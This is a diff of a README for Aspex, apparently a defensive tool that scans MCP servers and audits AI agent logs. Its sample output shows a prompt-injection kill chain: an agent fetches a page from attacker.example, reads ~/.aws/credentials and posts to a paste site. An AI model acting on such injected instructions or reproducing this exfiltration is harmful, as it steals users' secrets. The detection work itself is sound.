@@ -4,7 +4,7 @@
 
 # Aspex
 
-### MCP Security Toolkit
+### Security scanner and audit trail for AI agents that use MCP
 
 **Know what your MCP servers can do. Know what your agents actually did.**
 
@@ -13,7 +13,7 @@
 [![MCP-scanned by Aspex](https://img.shields.io/badge/MCP--scanned-by%20Aspex-5B44C3)](https://github.com/aspex-security/aspex)
 
 ```sh
-brew install aspex-security/tap/aspex
+brew install aspex-security/tap/aspex && aspex-scan
 ```
 
 **Offline. No account. No data leaves your machine. Ever.**
@@ -22,44 +22,94 @@ brew install aspex-security/tap/aspex
 
 ---
 
-## What is Aspex?
+## The problem
 
-Aspex is an open-source security toolkit for developers using AI coding agents. It answers two questions every MCP user should be asking:
+AI coding agents like Claude Code, Cursor, and Windsurf connect to tools through **MCP (Model Context Protocol)** - servers that give the agent access to your filesystem, your GitHub, your database, your browser. Most people install them by copy-pasting a config from a README.
 
-You wired an MCP server into Claude Code or Cursor. You copy-pasted the config from a README. The agent now has access to your filesystem, your GitHub, your browser.
+That leaves two questions nobody can answer today:
 
-**Do you know what that server is actually capable of? Do you know what it did the last time your agent ran?**
+1. **What can this server actually do to my machine?** - before you run it
+2. **What did my agent actually do?** - after it ran
 
-| Tool | What it does |
-|---|---|
-| `aspex-scan` | Static analysis of every MCP server on your machine - 140+ rules, 0-100 security score, cross-server attack paths |
-| `aspex-trace` | Runtime audit of your AI agent logs - reconstructs kill chains, traces instruction provenance, no proxy required |
+Aspex is one tool for each question.
+
+| | Tool | Answers | How |
+|---|---|---|---|
+| **Before** | `aspex-scan` | What can it do? | Static analysis of every MCP server on your machine. 140+ rules, 0-100 score, cross-server attack paths. |
+| **After** | `aspex-trace` | What did it do? | Reads the logs your AI client already writes. Reconstructs kill chains, traces where injected instructions came from. No proxy, no config change. |
+
+---
+
+## What it looks like
+
+```
+$ aspex-scan
+
+  ◆  aspex-scan  v0.5.5
+
+  Discovered 9 servers across claude, cursor, claude-code
+
+  filesystem      41  ██████████░░░░░░░░░░░░░░  HIGH     3 findings
+  github          78  ███████████████████░░░░░  MEDIUM   2 findings
+  postgres        55  █████████████░░░░░░░░░░░  HIGH     4 findings
+  slack           91  ██████████████████████░░  LOW      1 finding
+  ...
+
+  CRITICAL  MCP004  filesystem   write access to ~/  (entire home directory)
+  CRITICAL  MCP006  postgres     DATABASE_URL hardcoded in config env block
+  HIGH      MCP010  slack        remote server has no auth token
+
+  Overall  61 / 100      2 cross-server attack paths detected
+
+  Run aspex-scan --explain for WHY / EXPLOIT / IMPACT on each finding.
+  Run aspex-scan attack-paths to see how servers chain together.
+```
+
+```
+$ aspex-trace killchain --since 7d
+
+  CRITICAL  Credential Exfiltration          cursor · session a3f2 · 14:02
+    read_file  ~/.aws/credentials                        (filesystem)
+    fetch_url  https://pastebin.example/api/paste   +11s  (browser)
+    Source: web_fetch -> https://attacker.example/README.md  (12s earlier)
+    Confidence: HIGH - tight temporal coupling
+```
+
+---
+
+## Who this is for
+
+- **Developers** using AI agents who want to vet an MCP server before trusting it with their machine
+- **Security teams** who need visibility into what agents are doing across the org, in a format they can export to a SIEM
+- **MCP server authors** who want to prove their server is safe (add the badge above to your README)
+
+## What Aspex is not
+
+- **Not a proxy or gateway.** It never sits in the request path and adds zero latency to your agent.
+- **Not a blocker.** It audits and reports. You decide what to do.
+- **Not a SaaS.** Everything runs locally. There is nothing to sign up for.
 
 ---
 
 ## Quick start
 
-Run `aspex` for an interactive menu - arrow keys to navigate, enter to run:
-
 ```sh
-aspex
-```
-
-Or run directly:
-
-```sh
+aspex                    # Interactive menu - arrow keys, enter to run
 aspex-scan               # Audit every MCP server on this machine
-aspex-scan doctor        # Pre-flight health check (~2 seconds)
-aspex-trace              # Review what your agent did in the last 24 hours
+aspex-scan doctor        # 2-second pre-flight check: leaked secrets, broad paths
+aspex-scan --explain     # Full advisory on every finding
+aspex-trace              # What did my agent do in the last 24 hours?
 aspex-trace killchain    # Reconstruct multi-step attack patterns
 ```
+
+Also included: `aspex-attack` for security teams who want to actively probe servers they own with adversarial payloads. Opt-in, and only against servers you have permission to test.
 
 ---
 
 ## Install
 
 ```sh
-# macOS / Linux (recommended)
+# macOS / Linux
 brew install aspex-security/tap/aspex
 
 # Linux / Windows WSL
@@ -69,15 +119,31 @@ curl -fsSL https://raw.githubusercontent.com/aspex-security/aspex/main/install.s
 # https://github.com/aspex-security/aspex/releases
 ```
 
+Supports Claude Desktop, Claude Code, Cursor, Windsurf, Cline, Roo-Cline, Continue, and Zed.
+
+---
+
+## CI
+
+Fail a pipeline when a config change introduces a risky server:
+
+```yaml
+- uses: aspex-security/aspex/.github/actions/aspex-scan-action@main
+  with:
+    fail-on: high
+```
+
+Emits SARIF for GitHub Code Scanning. See the [CI guide](https://aspex.mintlify.site/guides/ci-integration).
+
 ---
 
 ## Documentation
 
-Full reference, guides, and examples at **[aspex.mintlify.site](https://aspex.mintlify.site)**
+**[aspex.mintlify.site](https://aspex.mintlify.site)** - full reference, guides, rule catalog
 
 - [aspex-scan reference](https://aspex.mintlify.site/tools/scan)
 - [aspex-trace reference](https://aspex.mintlify.site/tools/trace)
-- [CI integration guide](https://aspex.mintlify.site/guides/ci-integration)
+- [All 225+ detection rules](https://aspex.mintlify.site/reference/rules) - mapped to OWASP LLM Top 10, MITRE ATLAS, CWE
 - [Daily workflow guide](https://aspex.mintlify.site/guides/daily-workflow)
 
 ---
@@ -95,6 +161,8 @@ For fleet-wide coverage and enterprise policy enforcement, see [Onyx Security](h
 ## Contributing
 
 The most impactful contributions are new detection rules and log format updates as clients evolve. Adding a rule takes about 15 minutes - see [CONTRIBUTING.md](CONTRIBUTING.md).
+
+Security issues: do not open a public issue. Email steven.d@onyx.security.
 
 ---
 
